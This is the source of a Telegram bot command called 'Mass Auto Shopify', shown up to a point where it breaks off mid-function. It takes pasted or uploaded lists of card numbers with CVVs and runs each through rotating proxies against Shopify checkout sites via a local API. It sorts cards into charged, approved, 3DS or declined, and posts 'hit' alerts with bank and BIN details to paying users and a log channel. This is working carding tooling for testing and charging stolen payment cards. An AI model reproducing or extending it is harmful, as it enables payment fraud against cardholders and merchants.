import re, threading, time, random, io, hashlib, html, asyncio
from concurrent.futures import ThreadPoolExecutor
import requests
from telethon import Button, events
import config, utils, database as db
from utils import sbold, premium_emoji, format_hit_log, send_hit_log
from Commands.Admin.plan import get_user_plan, PLANS

CC_PATTERN = re.compile(r'(\d{13,19})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})')
ACTIVE_JOBS = {}
USER_ACTIVE_JOB = {}
MSH_SETTINGS = {}
RETRY_DATA = {}
ERROR_RETRIES = 5
API_URL = "http://localhost:5000"
SITES_FILE = "Data/sites.txt"

def load_sites(price_keys=None):
    if not price_keys:
        try:
            with open(SITES_FILE) as f:
                return [s.strip() for s in f if s.strip()]
        except:
            return []
    all_sites = []
    for pk in price_keys:
        fpath = f"Data/{pk}$.txt"
        try:
            with open(fpath) as f:
                all_sites.extend(s.strip() for s in f if s.strip())
        except:
            pass
    return all_sites

def parse_cards(text):
    cards = []
    for line in text.split('\n'):
        m = CC_PATTERN.search(line)
        if m:
            cards.append(m.groups())
    return cards

def build_progress(total, done, results, start_time, fname, plan_display, uid, stopped=False):
    charged = len(results["charged"])
    approved = len(results["approved"])
    threeds = len(results["3ds"])
    declined = len(results["declined"])
    errors = len(results["error"])
    elapsed = int(time.time() - start_time)
    mins, secs = elapsed // 60, elapsed % 60
    time_str = f"{mins:02d}:{secs:02d}"

    if done >= total or stopped:
        status = "𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱"
    else:
        status = "𝗥𝘂𝗻𝗻𝗶𝗻𝗴..."

    return premium_emoji(
        f"{sbold('Mass Auto Shopify')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{sbold('Status')} ➜ {status}\n"
        f"┗ 🐆 {sbold('Progress')} ➜ {done}/{total}\n"
        f"┗ 💎 {sbold('Charged')} ➜ {charged}\n"
        f"┗ ✅ {sbold('Approved')} ➜ {approved}\n"
        f"┗ ❎ {sbold('3DS')}➜ {threeds}\n"
        f"┗ ❌ {sbold('Declined')} ➜ {declined}\n"
        f"┗ ⚠️ {sbold('Errors')} ➜ {errors}\n"
        f"┗ 💫 {sbold('Time')}: {time_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{sbold('User:')} <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
    )

def build_result(results, start_time, fname, plan_display, uid):
    charged = len(results["charged"])
    approved = len(results["approved"])
    threeds = len(results["3ds"])
    declined = len(results["declined"])
    errors = len(results["error"])
    elapsed = int(time.time() - start_time)
    mins, secs = elapsed // 60, elapsed % 60
    time_str = f"{mins:02d}:{secs:02d}"

    return premium_emoji(
        f"{sbold('Results')} 🐋\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"┗ 💎 {sbold('Charged')} ➜ {charged}\n"
        f"┗ ✅ {sbold('Approved')} ➜ {approved}\n"
        f"┗ ❎ {sbold('3DS')}➜ {threeds}\n"
        f"┗ ❌ {sbold('Declined')} ➜ {declined}\n"
        f"┗ ⚠️ {sbold('Errors')} ➜ {errors}\n"
        f"┗ 💫 {sbold('Time')}: {time_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{sbold('User:')} <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
    )

def bin_lookup(cc):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        if r.status_code == 200:
            d = r.json()
            brand = d.get("brand", "N/A")
            btype = d.get("type", "N/A")
            bank = d.get("bank", "N/A")
            if isinstance(bank, dict):
                bank = bank.get("name", "N/A")
            country = d.get("country_name", "N/A")
            if isinstance(country, dict):
                country = country.get("name", "N/A")
            level = d.get("level", "N/A")
            flag = d.get("country_flag", "")
            return brand, btype, bank, country, level, flag
    except:
        pass
    return "N/A", "N/A", "N/A", "N/A", "N/A", ""

def build_file(results):
    lines = []
    for category in ("charged", "approved", "3ds", "declined", "error"):
        if not results[category]:
            continue
        label = category.upper()
        if category == "3ds":
            label = "3DS"
        if category == "error":
            label = "ERRORS"
        lines.append(f"{label}:")
        for item in results[category]:
            lines.append(f"{item[0]}|{item[1]}|{item[2]}|{item[3]} - {item[4]}")
        lines.append("")
    return "\n".join(lines)

def settings_text_and_markup(uid):
    s = MSH_SETTINGS.get(uid, {})
    step = s.get("step", "price")
    if step == "price":
        prices = s.get("prices", {"5": False, "10": False, "20": False})
        r1, r2 = [], []
        for label, key in [("5$","5"), ("10$","10")]:
            selected = prices.get(key, False)
            r1.append(Button.inline(sbold(label), f"mshp_{key}", style='success' if selected else 'danger'))
        for label, key in [("20$","20")]:
            selected = prices.get(key, False)
            r2.append(Button.inline(sbold(label), f"mshp_{key}", style='success' if selected else 'danger'))
        mk = [r1, r2, [Button.inline(sbold('Next'), "msh_next", style='success')]]
        text = f"{sbold('Select price levels, then tap Next')}"
    else:
        filters = s.get("filters", {"charged": False, "approved": False, "3ds": False})
        row1 = []
        for label, key in [("𝗖𝗵𝗮𝗿𝗴𝗲𝗱", "charged"), ("𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱", "approved")]:
            selected = filters.get(key, False)
            row1.append(Button.inline(label, f"mshf_{key}", style='success' if selected else 'danger'))
        row2 = []
        selected3 = filters.get("3ds", False)
        row2.append(Button.inline("𝟯𝗗𝗦", "mshf_3ds", style='success' if selected3 else 'danger'))
        mk = [row1, row2, [Button.inline(sbold('Done'), "msh_done", style='success')]]
        text = f"{sbold('Select what to keep, then tap Done')}"
    return text, mk

def register(client):
    @client.on(events.NewMessage(pattern=r'^/msh(\s|$|@)'))
    async def msh_command(event):
        uid = event.sender_id
        if not utils.is_authorized(event):
            return
        if not await utils.require_membership(client, event):
            return
        if utils.is_banned(uid):
            await event.reply("𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
            return
        if not utils.is_admin(uid) and not utils.is_premium(uid):
            await event.reply(utils.premium_emoji(
                "𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙊𝙣𝙡𝙮 👻\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "╰ 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙧𝙚𝙦𝙪𝙞𝙧𝙚𝙨 𝙖 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙥𝙡𝙖𝙣.\n"
                "╰ 𝘽𝙪𝙮 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙋𝙡𝙖𝙣"
            ), parse_mode='html')
            return
        utils.add_user(uid)

        cards = []
        if event.is_reply:
            replied = await event.get_reply_message()
            if replied.document:
                try:
                    file_bytes = await client.download_media(replied.document, bytes)
                    cards = parse_cards(file_bytes.decode('utf-8'))
                except:
                    pass
            elif replied.text:
                cards = parse_cards(replied.text)

        if not cards:
            await event.reply((
                "𝗨𝘀𝗮𝗴𝗲\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "┗ /msh (reply to a file or message with cards)\n\n"
                "𝗙𝗼𝗿𝗺𝗮𝘁: cc|mm|yy|cvv (one per line)"
            ))
            return

        plan_type, plan_name, _, cc_limit = get_user_plan(uid)
        if cc_limit and len(cards) > cc_limit:
            await event.reply(utils.premium_emoji(
                "𝗖𝗖 𝗟𝗶𝗺𝗶𝘁\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"╰ 𝙁𝙤𝙪𝙣𝙙 {len(cards)} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n"
                f"╰ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)\n"
                f"╰ {cc_limit} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙"
            ), parse_mode='html')
            cards = cards[:cc_limit]

        if utils.PROXY_QUEUE.qsize() == 0:
            await event.reply("𝗣𝗹𝗲𝗮𝘀𝗲 𝗳𝗶𝗿𝘀𝘁 𝗮𝗱𝗱 𝘆𝗼𝘂𝗿 𝗽𝗿𝗼𝘅𝘆")
            return

        plan_type, plan_name, _, _ = get_user_plan(uid)
        plan_display = sbold(plan_type.upper()) if plan_type else sbold('FREE')
        fname = (event.sender.first_name or "").replace('[', '').replace(']', '')

        MSH_SETTINGS[uid] = {
            "prices": {"5": False, "10": False, "20": False},
            "filters": {"charged": False, "approved": False, "3ds": False},
            "cards": cards, "fname": fname, "plan_display": plan_display,
            "chat_id": event.chat_id, "step": "price"
        }
        text, mk = settings_text_and_markup(uid)
        await event.reply(text, buttons=mk)

    @client.on(events.CallbackQuery(data=b'noop'))
    async def cb_noop(event):
        await event.answer()

    @client.on(events.CallbackQuery(pattern=b'^mshp_'))
    async def cb_price(event):
        uid = event.sender_id
        s = MSH_SETTINGS.get(uid)
        if not s:
            await event.answer("Session expired", alert=True)
            return
        key = event.data.decode()[5:]
        s["prices"][key] = not s["prices"].get(key)
        _, markups = settings_text_and_markup(uid)
        await event.answer()
        try:
            await client.edit_message(event.chat_id, event.message_id, buttons=markups)
        except:
            pass

    @client.on(events.CallbackQuery(data=b'msh_next'))
    async def cb_next(event):
        uid = event.sender_id
        s = MSH_SETTINGS.get(uid)
        if not s:
            await event.answer("Session expired", alert=True)
            return
        price_keys = [k for k, v in s["prices"].items() if v]
        if not price_keys:
            await event.answer("𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 𝗼𝗻𝗲 𝗽𝗿𝗶𝗰𝗲 𝗹𝗲𝘃𝗲𝗹", alert=True)
            return
        s["step"] = "filters"
        text, mk = settings_text_and_markup(uid)
        await event.answer()
        try:
            await client.edit_message(event.chat_id, event.message_id, text, buttons=mk)
        except:
            pass

    @client.on(events.CallbackQuery(pattern=b'^mshf_'))
    async def cb_filter(event):
        uid = event.sender_id
        s = MSH_SETTINGS.get(uid)
        if not s:
            await event.answer("Session expired", alert=True)
            return
        key = event.data.decode()[5:]
        s["filters"][key] = not s["filters"].get(key, False)
        _, markups = settings_text_and_markup(uid)
        await event.answer()
        try:
            await client.edit_message(event.chat_id, event.message_id, buttons=markups)
        except:
            pass

    @client.on(events.CallbackQuery(data=b'msh_done'))
    async def cb_done(event):
        uid = event.sender_id
        s = MSH_SETTINGS.get(uid)
        if not s:
            await event.answer("Session expired", alert=True)
            return
        s["price_keys"] = [k for k, v in s["prices"].items() if v]
        filters = s.get("filters", {})
        if not any(filters.values()):
            await event.answer("𝗧𝗶𝗰𝗸 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 𝗼𝗻𝗲: 𝗖𝗵𝗮𝗿𝗴𝗲𝗱, 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱, 𝗼𝗿 𝟯𝗗𝗦", alert=True)
            return
        await cb_start_check(event)

    async def cb_start_check(event):
        uid = event.sender_id
        s = MSH_SETTINGS.pop(uid, None)
        if not s:
            await event.answer("Session expired", alert=True)
            return
        await event.answer()
        price_keys = s.get("price_keys", [])
        sites = load_sites(price_keys)
        if not sites:
            try: await client.send_message(uid, "𝗡𝗼 𝘀𝗶𝘁𝗲𝘀 𝗰𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗲𝗱!")
            except: pass
            return
        cards = s["cards"]
        fname = s["fname"]
        plan_display = s["plan_display"]
        filters = s.get("filters", {"charged": False, "approved": False, "3ds": False})

        total = len(cards)
        results = {"charged": [], "approved": [], "3ds": [], "declined": [], "error": []}
        job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
        ACTIVE_JOBS[job_id] = True
        USER_ACTIVE_JOB[uid] = job_id
        start_time = time.time()

        stop_kb = [[Button.inline("𝗦𝗧𝗢𝗣", f"stop_{job_id}", style='danger')]]

        try:
            await client.edit_message(event.chat_id, event.message_id,
                build_progress(total, 0, results, start_time, fname, plan_display, uid),
                buttons=stop_kb, parse_mode='html')
            status_msg_id = event.message_id
        except:
            status_msg = await client.send_message(event.chat_id,
                build_progress(total, 0, results, start_time, fname, plan_display, uid),
                buttons=stop_kb, parse_mode='html')
            status_msg_id = status_msg.id

        WORKERS = config.WORKERS
        results_lock = threading.Lock()
        progress_idx = [0]
        loop = asyncio.get_event_loop()

        def process_one(cc, mes, ano, cvv):
            if not ACTIVE_JOBS.get(job_id):
                return
            full_card = f"{cc}|{mes}|{ano}|{cvv}"
            best_data = None
            for retry in range(ERROR_RETRIES + 1):
                if not ACTIVE_JOBS.get(job_id):
                    return
                site_val = "N/A"
                _, proxy_raw = utils.get_proxy_dict()
                if not proxy_raw:
                    continue
                data = {}
                for attempt in range(config.RETRY_ON_ERRORS + 1):
                    try:
                        site_val = random.choice(sites)
                        params = {"site": site_val, "cc": full_card, "proxy": proxy_raw}
                        r = requests.get(f"{API_URL}/autoshopify", params=params, timeout=60)
                        data = r.json()
                        resp_text = data.get("Response", "")
                        if not any(kw in resp_text.lower() for kw in config.ERROR_KEYWORDS):
                            break
                    except:
                        data = {"Response": "ERROR", "Gate": "UNKNOWN", "Charged": "False", "Approved": "False"}
                utils.release_proxy(proxy_raw)
                clean_resp = data.get("Response", "UNKNOWN")
                rl = clean_resp.lower()
                is_err = any(kw in rl for kw in ["site error", "proxy error", "cannot connect to host", "payment method not available", "unable to get payment token", "error processing card", "site requires login", "not supported", "fraud_suspected", "processing_error", "generic_error", "failed to get", "no valid product", "not shopify", "captcha", "throttled", "rate_limited", "invalid_purchase", "openssl", "unknown result", "merchandise_expected_price_mismatch"]) or "ssl" in rl or "connection" in rl
                if is_err and retry < ERROR_RETRIES:
                    time.sleep(1)
                    continue
                best_data = data
                break
            if best_data is None:
                best_data = {"Response": "ERROR", "Gate": "UNKNOWN", "Charged": "False", "Approved": "False", "Price": "0.00"}
            data = best_data
            clean_resp = data.get("Response", "UNKNOWN")
            gateway_val = data.get("Gate", "UNKNOWN")
            price_val = data.get("Price", "0.00")
            clean = clean_resp
            rl = clean.lower()
            if not ACTIVE_JOBS.get(job_id):
                return
            is_charged = False
            is_approved = False
            is_threeds = False
            charged_field = data.get("Charged", "False")
            approved_field = data.get("Approved", "False")
            if charged_field == "True" or "order_placed" in rl:
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["charged"].append(entry)
                is_charged = True
                db.incr_stat("charged")
            elif approved_field == "True":
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["approved"].append(entry)
                db.incr_stat("approved")
                db.incr_user_stat(uid, "approved")
                is_approved = True
            elif "otp_required" in rl or "3ds" in rl:
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["3ds"].append(entry)
                is_threeds = True
                db.incr_stat("3ds")
            elif any(kw in rl for kw in ["insufficient", "invalid_cvc", "incorrect_zip"]):
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["approved"].append(entry)
                is_approved = True
                db.incr_stat("approved")
                db.incr_user_stat(uid, "approved")
            elif "card_declined" in rl or rl.strip() == "declined":
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["declined"].append(entry)
                db.incr_stat("declined")
            elif any(kw in rl for kw in ["site error", "proxy error", "cannot connect to host", "payment method not available", "unable to get payment token", "error processing card", "site requires login", "not supported", "fraud_suspected", "processing_error", "generic_error", "failed to get", "no valid product", "not shopify", "captcha", "throttled", "rate_limited", "invalid_purchase", "openssl", "unknown result", "merchandise_expected_price_mismatch"]) or "ssl" in rl or "connection" in rl:
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["error"].append(entry)
            elif "decision_rule_block" in rl or any(kw in rl for kw in ["mismatch", "denied", "rejected", "timeout", "429", "402", "401", "404", "503", "504", "502"]) or rl.startswith("error") or "fail" in rl:
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["declined"].append(entry)
                db.incr_stat("declined")
            else:
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["declined"].append(entry)
                db.incr_stat("declined")

            with results_lock:
                progress_idx[0] += 1
                done = progress_idx[0]

            if ACTIVE_JOBS.get(job_id) and is_charged:
                brand, btype, bank, country, level, flag = bin_lookup(cc)
                level_str = f" | {level.upper()}" if level and level not in ("N/A", "/", "UNKNOWN", "") else ""
                hit_text = (
                    f"{sbold('CHARGED')} 💎\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('Card')}: <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                    f"{sbold('Response')}: {sbold(html.escape(clean))}\n"
                    f"{sbold('Price')}: {sbold(f'${price_val}')}\n"
                    f"{sbold('Gateway')}: {sbold(html.escape(gateway_val))}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('BIN')}: {sbold(f'{brand.upper()} | {btype.upper()}{level_str}')}\n"
                    f"{sbold('Bank')}: {sbold(bank)}\n"
                    f"{sbold('Country')}: {sbold(country)} {flag}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('User')}: <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
                )
                if filters.get("charged"):
                    try:
                        sent = asyncio.run_coroutine_threadsafe(
                            client.send_message(uid, premium_emoji(hit_text), parse_mode='html'), loop).result()
                        asyncio.run_coroutine_threadsafe(
                            client.pin_message(uid, sent.id), loop).result()
                    except:
                        pass
                try:
                    log_text = format_hit_log(gateway_val, clean, price_val, f"<a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]", "💎", "CHARGED")
                    asyncio.run_coroutine_threadsafe(
                        send_hit_log(client, log_text), loop).result()
                except:
                    pass


            if ACTIVE_JOBS.get(job_id) and is_approved:
                brand, btype, bank, country, level, flag = bin_lookup(cc)
                level_str = f" | {level.upper()}" if level and level not in ("N/A", "/", "UNKNOWN", "") else ""
                hit_text = (
                    f"{sbold('APPROVED')} ✅\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('Card')}: <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                    f"{sbold('Response')}: {sbold(html.escape(clean))}\n"
                    f"{sbold('Price')}: {sbold(f'${price_val}')}\n"
                    f"{sbold('Gateway')}: {sbold(html.escape(gateway_val))}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('BIN')}: {sbold(f'{brand.upper()} | {btype.upper()}{level_str}')}\n"
                    f"{sbold('Bank')}: {sbold(bank)}\n"
                    f"{sbold('Country')}: {sbold(country)} {flag}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('User')}: <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
                )
                if filters.get("approved"):
                    try:
                        asyncio.run_coroutine_threadsafe(
                            client.send_message(uid, premium_emoji(hit_text), parse_mode='html'), loop).result()
                    except:
                        pass
                try:
                    log_text = format_hit_log(gateway_val, clean, price_val, f"<a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]", "✅", "APPROVED")
                    asyncio.run_coroutine_threadsafe(
                        send_hit_log(client, log_text), loop).result()
                except:
                    pass


            if ACTIVE_JOBS.get(job_id) and is_threeds:
                brand, btype, bank, country, level, flag = bin_lookup(cc)
                level_str = f" | {level.upper()}" if level and level not in ("N/A", "/", "UNKNOWN", "") else ""
                hit_text = (
                    f"{sbold('3DS')} ⚡️\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('Card')}: <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                    f"{sbold('Response')}: {sbold(html.escape(clean))}\n"
                    f"{sbold('Price')}: {sbold(f'${price_val}')}\n"
                    f"{sbold('Gateway')}: {sbold(html.escape(gateway_val))}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('BIN')}: {sbold(f'{brand.upper()} | {btype.upper()}{level_str}')}\n"
                    f"{sbold('Bank')}: {sbold(bank)}\n"
                    f"{sbold('Country')}: {sbold(country)} {flag}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('User')}: <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
                )
                if filters.get("3ds"):
                    try:
                        asyncio.run_coroutine_threadsafe(
                            client.send_message(uid, premium_emoji(hit_text), parse_mode='html'), loop).result()
                    except:
                        pass
                try:
                    log_text = format_hit_log(gateway_val, clean, price_val, f"<a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]", "⚡️", "3DS")
                    asyncio.run_coroutine_threadsafe(
                        send_hit_log(client, log_text), loop).result()
                except:
                    pass


            if ACTIVE_JOBS.get(job_id) and (done % 5 == 0 or done == total):
                try:
                    asyncio.run_coroutine_threadsafe(
                        client.edit_message(event.chat_id, status_msg_id,
                            build_progress(total, done, results, start_time, fname, plan_display, uid),
                            buttons=stop_kb, parse_mode='html'), loop).result()
                except:
                    pass

        def worker():
            with ThreadPoolExecutor(max_workers=WORKERS) as pool:
                futures = []
                for (cc, mes, ano, cvv) in cards:
                    if not ACTIVE_JOBS.get(job_id):
                        break
                    futures.append(pool.submit(process_one, cc, mes, ano, cvv))
                for f in futures:
                    f.result()
                    if not ACTIVE_JOBS.get(job_id):
                        break

            ACTIVE_JOBS.pop(job_id, None)
            USER_ACTIVE_JOB.pop(uid, None)

            for cat in ["charged", "approved", "3ds"]:
                if not filters.get(cat):
                    results[cat] = []

            done = progress_idx[0]
            try:
                asyncio.run_coroutine_threadsafe(
                    client.edit_message(event.chat_id, status_msg_id,
                        build_progress(total, done, results, start_time, fname, plan_display, uid, stopped=True),
                        parse_mode='html'),
                    loop).result()
            except:
                pass
            time.sleep(0.5)

            total_checked = len(results["charged"]) + len(results["approved"]) + len(results["3ds"]) + len(results["declined"]) + len(results["error"])
            file_content = build_file(results)
            file_bio = io.BytesIO(file_content.encode('utf-8'))
            file_bio.name = "Results.txt"
            try:
                asyncio.run_coroutine_threadsafe(
                    client.send_file(event.chat_id, file_bio,
                        caption=build_result(results, start_time, fname, plan_display, uid),
                        parse_mode='html'),
                    loop).result()
            except:
                pass

            def card_block(label, item):
                cc = item[0]
                brand, btype, bank, country, level, flag = bin_lookup(cc)
                price_val = float(item[7]) if len(item) > 7 else 0.0
                price_str = f"{price_val:.2f}"
                level_str = f" | {level.upper()}" if level and level not in ("N/A", "/", "UNKNOWN", "") else ""
                return premium_emoji(
                    f"{sbold(label)}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('Card')}: <code>{item[0]}|{item[1]}|{item[2]}|{item[3]}</code>\n"
                    f"{sbold('Response')}: {html.escape(item[4])}\n"
                    f"{sbold('Price')}: ${price_str}\n"
                    f"{sbold('Gateway')}: {html.escape(item[5])}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('BIN')}: {brand.upper()} | {btype.upper()}{level_str}\n"
                    f"{sbold('Bank')}: {bank}\n"
                    f"{sbold('Country')}: {country}\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"{sbold('User')}: <a href=\"tg://user?id={uid}\">{html.escape(sbold(fname))}</a> [{plan_display}]"
                )



            if results["error"]:
                retry_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
                RETRY_DATA[retry_id] = {
                    "cards": [(e[0], e[1], e[2], e[3]) for e in results["error"]],
                    "prices": price_keys,
                    "notify": filters,
                    "fname": fname,
                    "plan_display": plan_display,
                    "chat_id": event.chat_id,
                    "uid": uid
                }
                retry_kb = [[Button.inline("𝗥𝗲𝘁𝗿𝘆 𝗘𝗿𝗿𝗼𝗿𝘀", f"retry_{retry_id}", style='primary')]]
                try:
                    asyncio.run_coroutine_threadsafe(
                        client.edit_message(event.chat_id, status_msg_id,
                            build_progress(total, done, results, start_time, fname, plan_display, uid, stopped=True),
                            buttons=retry_kb, parse_mode='html'), loop).result()
                except:
                    pass

        t = threading.Thread(target=worker, daemon=True)
        t.start()

    @client.on(events.CallbackQuery(pattern=b'^retry_'))
    async def cb_retry(event):
        retry_id = event.data.decode()[6:]
        data = RETRY_DATA.pop(retry_id, None)
        if not data:
            await event.answer("Retry session expired", alert=True)
            return
        await event.answer("𝗥𝗲𝘁𝗿𝘆𝗶𝗻𝗴...")
        await retry_start_check(event, data)

    async def retry_start_check(event, data):
        uid = event.sender_id
        cards = data["cards"]
        price_keys = data["prices"]
        filters = data["notify"]
        fname = data["fname"]
        plan_display = data["plan_display"]
        chat_id = data["chat_id"]

        sites = load_sites(price_keys)
        if not sites:
            try: await client.send_message(chat_id, "𝗡𝗼 𝘀𝗶𝘁𝗲𝘀 𝗰𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗲𝗱!")
            except: pass
            return

        total = len(cards)
        results = {"charged": [], "approved": [], "3ds": [], "declined": [], "error": []}
        job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
        ACTIVE_JOBS[job_id] = True
        USER_ACTIVE_JOB[uid] = job_id
        start_time = time.time()

        stop_kb = [[Button.inline("𝗦𝗧𝗢𝗣", f"stop_{job_id}", style='danger')]]

        status_msg = await client.send_message(chat_id,
            build_progress(total, 0, results, start_time, fname, plan_display, uid),
            buttons=stop_kb, parse_mode='html')

        WORKERS = config.WORKERS
        results_lock = threading.Lock()
        progress_idx = [0]
        loop = asyncio.get_event_loop()

        def process_one(cc, mes, ano, cvv):
            if not ACTIVE_JOBS.get(job_id):
                return
            full_card = f"{cc}|{mes}|{ano}|{cvv}"
            best_data = None
            for retry in range(ERROR_RETRIES + 1):
                if not ACTIVE_JOBS.get(job_id):
                    return
                site_val = "N/A"
                _, proxy_raw = utils.get_proxy_dict()
                if not proxy_raw:
                    continue
                data = {}
                for attempt in range(config.RETRY_ON_ERRORS + 1):
                    try:
                        site_val = random.choice(sites)
                        params = {"site": site_val, "cc": full_card, "proxy": proxy_raw}
                        r = requests.get(f"{API_URL}/autoshopify", params=params, timeout=60)
                        data = r.json()
                        resp_text = data.get("Response", "")
                        if not any(kw in resp_text.lower() for kw in config.ERROR_KEYWORDS):
                            break
                    except:
                        data = {"Response": "ERROR", "Gate": "UNKNOWN", "Charged": "False", "Approved": "False"}
                utils.release_proxy(proxy_raw)
                clean_resp = data.get("Response", "UNKNOWN")
                rl = clean_resp.lower()
                is_err = any(kw in rl for kw in ["site error", "proxy error", "cannot connect to host", "payment method not available", "unable to get payment token", "error processing card", "site requires login", "not supported", "fraud_suspected", "processing_error", "generic_error", "failed to get", "no valid product", "not shopify", "captcha", "throttled", "rate_limited", "invalid_purchase", "openssl", "unknown result", "merchandise_expected_price_mismatch"]) or "ssl" in rl or "connection" in rl
                if is_err and retry < ERROR_RETRIES:
                    time.sleep(1)
                    continue
                best_data = data
                break
            if best_data is None:
                best_data = {"Response": "ERROR", "Gate": "UNKNOWN", "Charged": "False", "Approved": "False", "Price": "0.00"}
            data = best_data
            clean_resp = data.get("Response", "UNKNOWN")
            gateway_val = data.get("Gate", "UNKNOWN")
            price_val = data.get("Price", "0.00")
            clean = clean_resp
            rl = clean.lower()
            if not ACTIVE_JOBS.get(job_id):
                return
            is_charged = False
            is_approved = False
            is_threeds = False
            charged_field = data.get("Charged", "False")
            approved_field = data.get("Approved", "False")
            if charged_field == "True" or "order_placed" in rl:
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["charged"].append(entry)
                is_charged = True
                db.incr_stat("charged")
            elif approved_field == "True":
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["approved"].append(entry)
                db.incr_stat("approved")
                db.incr_user_stat(uid, "approved")
                is_approved = True
            elif "otp_required" in rl or "3ds" in rl:
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["3ds"].append(entry)
                is_threeds = True
                db.incr_stat("3ds")
            elif any(kw in rl for kw in ["insufficient", "invalid_cvc", "incorrect_zip"]):
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["approved"].append(entry)
                is_approved = True
                db.incr_stat("approved")
                db.incr_user_stat(uid, "approved")
            elif "card_declined" in rl or rl.strip() == "declined":
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["declined"].append(entry)
                db.incr_stat("declined")
            elif any(kw in rl for kw in ["site error", "proxy error", "cannot connect to host", "payment method not available", "unable to get payment token", "error processing card", "site requires login", "not supported", "fraud_suspected", "processing_error", "generic_error", "failed to get", "no valid product", "not shopify", "captcha", "throttled", "rate_limited", "invalid_purchase", "openssl", "unknown result", "merchandise_expected_price_mismatch"]) or "ssl" in rl or "connection" in rl:
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["error"].append(entry)
            elif "decision_rule_block" in rl or any(kw in rl for kw in ["mismatch", "denied", "rejected", "timeout", "429", "402", "401", "404", "503", "504", "502"]) or rl.startswith("error") or "fail" in rl:
                with results_lock:
                    entry = (cc, mes, ano, cvv, clean, gateway_val, site_val, price_val)
                    results["declined"].append(entry)
                db.incr_stat("declined")
            else:
